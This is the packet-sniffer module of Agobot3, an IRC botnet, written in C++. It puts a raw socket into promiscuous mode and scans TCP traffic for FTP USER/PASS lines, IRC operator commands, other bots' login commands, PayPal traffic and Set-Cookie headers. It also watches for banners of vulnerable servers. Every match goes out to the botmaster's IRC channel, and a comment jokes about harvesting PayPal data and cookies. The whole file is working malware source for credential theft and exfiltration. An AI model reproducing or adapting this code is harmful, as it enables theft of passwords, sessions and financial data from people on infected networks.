/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cthread.h"
#include "sniffer.h"
#include "mainctrl.h"

// TODO: Add cvar sniffer_level (0-10)

bool IsSuspiciousBot(const char *szBuf) {
	if(strstr(szBuf, "Bot sniff")) return false;
	if(strstr(szBuf, g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr())) return false;
	if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false;
	if(strstr(szBuf, "JOIN #")) return true;
	if(strstr(szBuf, "302 ")) return true;
	if(strstr(szBuf, "366 ")) return true;
	if(strstr(szBuf, ":.login")) return true;
	if(strstr(szBuf, ":!login")) return true;
	if(strstr(szBuf, ":!Login")) return true;
	if(strstr(szBuf, ":.Login")) return true;
	if(strstr(szBuf, ":.ident")) return true;
	if(strstr(szBuf, ":!ident")) return true;
	if(strstr(szBuf, ":.hashin")) return true;
	if(strstr(szBuf, ":!hashin")) return true;
	if(strstr(szBuf, ":.secure")) return true;
	if(strstr(szBuf, ":!secure")) return true;
//	if(strstr(szBuf, ":.auth")) return true;
//	if(strstr(szBuf, ":!auth")) return true;
//	if(strstr(szBuf, "login ")) return true;
//	if(strstr(szBuf, "auth ")) return true;
//	if(strstr(szBuf, ":.id ")) return true;
//	if(strstr(szBuf, ":!id ")) return true;
//	if(strstr(szBuf, "id")) return true;
//	if(strstr(szBuf, "ident")) return true;
//	if(strstr(szBuf, "\1HASH\1")) return true;
//	if(strstr(szBuf, ":.l")) return true;
//	if(strstr(szBuf, ":!l")) return true;
//	if(strstr(szBuf, ":$l")) return true;
//	if(strstr(szBuf, " CDKey (")) return true;
//	if(strstr(szBuf, "Pan Attacking")) return true;
//	if(strstr(szBuf, "Packets")) return true;
//	if(strstr(szBuf, "packets")) return true;
//	if(strstr(szBuf, "packeting")) return true;
//	if(strstr(szBuf, "sending")) return true;
//	if(strstr(szBuf, "ddos")) return true;
//	if(strstr(szBuf, "syn")) return true;
//	if(strstr(szBuf, "syn3")) return true;
//	if(strstr(szBuf, "flood")) return true;
//	if(strstr(szBuf, ".x")) return true;
//	if(strstr(szBuf, "!x")) return true;
//	if(strstr(szBuf, "random")) return true;
	return false; }

bool IsSuspiciousIRC(const char *szBuf) {
	if(strstr(szBuf, "IRC sniff")) return false;
	if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false;
	if(strstr(szBuf, g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr())) return false;
	if(strstr(szBuf, "OPER ")) return true;
	if(strstr(szBuf, "NICK ")) return true;
	if(strstr(szBuf, "oper ")) return true;
	if(strstr(szBuf, "You are now an IRC Operator")) return true;
	return false; }

bool IsSuspiciousFTP(const char *szBuf) {
	if(strstr(szBuf, "FTP sniff")) return false;
	if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false;
	if(strstr(szBuf, g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr())) return false;
	//if(strstr(szBuf, "NICK ")) return false;
	//if(strstr(szBuf, "220 ")) return true;
	//if(strstr(szBuf, "230 ")) return true;
	if(strstr(szBuf, "USER ")) return true;
	if(strstr(szBuf, "PASS ")) return true;
	return false; }

// Like paypals? ;-D How about cookies? YUMMEH! -rain

bool IsSuspiciousHTTP(const char *szBuf) {
	if(strstr(szBuf, "HTTP sniff")) return false;
	if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false;
	if(strstr(szBuf, g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr())) return false;
	if(strstr(szBuf, "paypal")) return true;
	if(strstr(szBuf, "PAYPAL")) return true;
	if(strstr(szBuf, "PAYPAL.COM")) return true;
	if(strstr(szBuf, "paypal.com")) return true;
	if(strstr(szBuf, "Set-Cookie:")) return true;
	return false; }

bool IsSuspiciousVULN(const char *szBuf) {
	if(strstr(szBuf, "VULN sniff")) return false;
	if(strstr(szBuf, g_pMainCtrl->m_sUserName.CStr())) return false;
	if(strstr(szBuf, g_pMainCtrl->m_cBot.si_mainchan.sValue.CStr())) return false;
	if(strstr(szBuf, "OpenSSL/0.9.6")) return true;
	if(strstr(szBuf, "Serv-U FTP Server")) return true;
	if(strstr(szBuf, "OpenSSH_2")) return true; 
	return false; }

CSniffer::CSniffer() { m_szType="CSniffer"; }
CSniffer::~CSniffer() { }
void *CSniffer::Run() {
	int sock; sockaddr_in addr_in; hostent *hEnt;
	IPHEADER *ipHeader; TCPHEADER *tcpHeader; char *szPacket;
	char szName[255]={0}; unsigned long lLocalIp;
	addr_in.sin_family=AF_INET; addr_in.sin_port=0; addr_in.sin_addr.s_addr=0;
	gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
	memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
	addr_in.sin_addr.s_addr=lLocalIp;

	sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP); 

	if(sock==INVALID_SOCKET) return NULL;
	if(bind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR) {
#ifdef _WIN32
		closesocket(sock);
#else
		close(sock);
#endif // _WIN32
		return NULL; }

#ifdef WIN32
	int optval=1; DWORD dwBytesRet;
	if(WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR)
	{	closesocket(sock); return NULL; }
#endif // WIN32

	char szRecvBuf[65535]; ipHeader=(IPHEADER*)szRecvBuf; int iRead;

	while(g_pMainCtrl->m_bRunning)
	{	// Clear the buffer
		memset(szRecvBuf, 0, sizeof(szRecvBuf)); iRead=0;

		// Wait till the sniffer is enabled
		while(!g_pMainCtrl->m_cBot.sniffer_enabled.bValue) Sleep(1000);
		
		// Read the raw packet
#ifdef _WIN32
		iRead=recv(sock, szRecvBuf, sizeof(szRecvBuf), 0);
#else
		iRead=recv(sock, szRecvBuf, sizeof(szRecvBuf), 0);
#endif // _WIN32

		// Process if its a TCP/IP packet
		if(ipHeader->proto==6)
		{	tcpHeader=(TCPHEADER*)(szRecvBuf+sizeof(*ipHeader));
			int iSrcPort, iDestPort; char szSrcHost[2048], szDestHost[2048];
			iSrcPort=ntohs(tcpHeader->th_sport); iDestPort=ntohs(tcpHeader->th_dport);
			
			if(iSrcPort !=110 && iSrcPort!=25 &&
			   iDestPort !=110 && iDestPort!=25 &&
			   iSrcPort!=g_pMainCtrl->m_cBot.si_port.iValue && iDestPort!=g_pMainCtrl->m_cBot.si_port.iValue)
			{
			sprintf(szSrcHost, "%s", inet_ntoa(to_in_addr(ipHeader->sourceIP)));
			sprintf(szDestHost, "%s", inet_ntoa(to_in_addr(ipHeader->destIP)));

			szPacket=(char*)(szRecvBuf+sizeof(*tcpHeader)+sizeof(*ipHeader));
			for(int i=0; i<strlen(szPacket); i++) {
				if(szPacket[i]=='\r') szPacket[i]='\x20';
				if(szPacket[i]=='\n') szPacket[i]='\x20'; }

			if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousBot(szPacket))

			{	g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.sniffer_channel.sValue.Str(),
					"Bot sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket);
			}


			else if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousIRC(szPacket))
			{	g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.sniffer_channel.sValue.Str(),
					"IRC sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
			}

			else if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousFTP(szPacket))
			{
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.sniffer_channel.sValue.Str(),
					"FTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
			}

			else if(IsSuspiciousHTTP(szPacket))
			{
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.sniffer_channel.sValue.Str(),
					"HTTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
			}
			else if(IsSuspiciousVULN(szPacket))
			{
				g_pMainCtrl->m_cIRC.SendFormat(false, false, g_pMainCtrl->m_cBot.vuln_channel.sValue.Str(),
					"VULN sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
			}
		}
	}
	}
	return NULL;
}
